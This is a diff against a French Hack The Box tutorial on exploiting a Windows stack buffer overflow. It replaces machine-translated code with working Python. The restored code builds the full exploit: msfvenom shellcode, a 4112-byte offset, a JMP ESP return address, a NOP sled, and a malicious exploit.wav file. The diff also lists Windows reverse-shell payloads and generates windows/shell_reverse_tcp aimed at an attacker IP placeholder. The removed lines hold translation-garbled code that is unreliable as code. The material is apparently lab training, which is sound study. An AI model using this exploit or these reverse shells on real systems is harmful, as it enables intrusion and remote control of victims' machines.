@@ -24,14 +24,14 @@ Ainsi, pour générer notre shellcode, nous utiliserons `msfvenom`, qui peut g�
 Tout d'abord, nous pouvons répertorier toutes les charges utiles disponibles pour "Windows 32 bits", comme suit :
 
 ```
-dsgsec@htb[/htb]$ msfvenom -l charges utiles | grep
+dsgsec@htb[/htb]$ msfvenom -l payloads | grep
 
-...COUPER...
-     windows/exec Exécute une commande arbitraire
-     windows/format_all_drives Cette charge utile formate tous les disques montés dans Windows (alias ShellcodeOfDeath). Après le formatage, cette charge utile définit le nom de volume sur la chaîne spécifiée dans l'option VOLUMELABEL. Si le code ne parvient pas à accéder à un lecteur pour
-     windows/loadlibrary Charger un chemin de bibliothèque arbitraire
-     windows/messagebox Génère une boîte de dialogue via MessageBox en utilisant un titre, un texte et une icône personnalisables
-...COUPER...
+...SNIP...
+    windows/exec                                        Execute an arbitrary command
+    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
+    windows/loadlibrary                                 Load an arbitrary library path
+    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
+...SNIP...
 
 ```
 
@@ -40,12 +40,12 @@ Pour le test initial, essayons `windows/exec` et exécutons `calc.exe` pour 
 ```
 dsgsec@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
 
-...COUPER...
-buf = b""
+...SNIP...
+buf =  b""
 buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
 buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
 buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
-...COUPER...
+...SNIP..
 
 ```
 
@@ -56,12 +56,12 @@ Ensuite, nous pouvons copier la variable `buf` dans notre exploit, où nous al
 Code : python
 
 ```
-def exploit() :
-     # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
-     buf = b""
-     buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
-     ...COUPER...
-     buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+    buf =  b""
+    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
+    ...SNIP...
+    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
 
 ```
 
@@ -80,7 +80,7 @@ Maintenant que nous avons notre shellcode, nous pouvons écrire la charge utile 
 
 Dans la section précédente, nous avons trouvé plusieurs adresses de retour qui peuvent fonctionner pour exécuter n'importe quel shellcode que nous écrivons sur la pile :
 
-| `ESP` | `JMP ESP` | `APPUYER ESP ; RET` |
+| `ESP` | `JMP ESP` | `PUSH ESP; RET` |
 | --- | --- | --- |
 | `0014F974` | `00419D0B` | `0047D4F5` |
 | - | `00463B91` | `00483D0E` |
@@ -104,9 +104,9 @@ Nous pouvons maintenant utiliser `pack` pour transformer notre adresse dans so
 Code : python
 
 ```
-     décalage = 4112
-     tampon = b"A"*décalage
-     eip = pack('<L', 0x00419D0B)
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
 
 ```
 
@@ -126,7 +126,7 @@ L'alignement de la pile nécessaire ne dépasse généralement pas `16` octets
 Code : python
 
 ```
-     non = b"\x90"*32
+     nop = b"\x90"*32
 
 ```
 
@@ -140,11 +140,11 @@ Avec cela, notre charge utile finale devrait ressembler à ceci :
 Code : python
 
 ```
-     décalage = 4112
-     tampon = b"A"*décalage
-     eip = pack('<L', 0x00419D0B)
-     non = b"\x90"*32
-     charge utile = tampon + eip + nop + buf
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
 
 ```
 
@@ -153,8 +153,8 @@ Nous pouvons ensuite écrire `payload` dans un fichier `exploit.wav` , comm
 Code : python
 
 ```
-     avec open('exploit.wav', 'wb') comme f :
-         f.write(charge utile)
+    with open('exploit.wav', 'wb') as f:
+        f.write(payload)
 
 ```
 
@@ -163,22 +163,22 @@ Une fois que nous avons assemblé toutes ces parties, notre fonction `exploit()
 Code : python
 
 ```
-def exploit() :
-     # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
-     buf = b""
-     ...COUPER...
-     buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+    buf = b""
+    ...SNIP...
+    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
 
-     décalage = 4112
-     tampon = b"A"*décalage
-     eip = pack('<L', 0x00419D0B)
-     non = b"\x90"*32
-     charge utile = tampon + eip + nop + buf
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
 
-     avec open('exploit.wav', 'wb') comme f :
-         f.write(charge utile)
+    with open('exploit.wav', 'wb') as f:
+        f.write(payload)
 
-exploiter()
+exploit()
 
 ```
 
@@ -211,18 +211,18 @@ buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
 Si nous voulions obtenir un shell inversé, nous pouvons utiliser de nombreuses charges utiles "msfvenom", dont nous pouvons obtenir la liste suivante :
 
 ```
-dsgsec@htb[/htb]$ msfvenom -l charges utiles | grep fenêtres | grep inverse
+dsgsec@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
 
-...COUPER...
-     windows/shell/reverse_tcp Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant
-     windows/shell/reverse_tcp_allports Générer un shell de commande canalisé (mis en scène). Essayez de vous reconnecter à l'attaquant, sur tous les ports possibles (1-65535, lentement)
-     windows/shell/reverse_tcp_dns Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant
-     windows/shell/reverse_tcp_rc4 Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant
-     windows/shell/reverse_tcp_rc4_dns Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant
-     windows/shell/reverse_tcp_uuid Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant avec le support UUID
-     windows/shell/reverse_udp Générer un shell de commande canalisé (mis en scène). Reconnectez-vous à l'attaquant avec le support UUID
-     windows/shell_reverse_tcp Se reconnecter à l'attaquant et générer un shell de commande
-...COUPER...
+...SNIP...
+    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+...SNIP...
 
 ```
 
@@ -231,10 +231,10 @@ Nous pouvons utiliser la charge utile `windows/shell_reverse_tcp` comme suit :
 ```
 dsgsec@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
 
-...COUPER...
-buf = b""
+...SNIP...
+buf =  b""
 buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
-...COUPER...
+...SNIP...
 
 ```
 
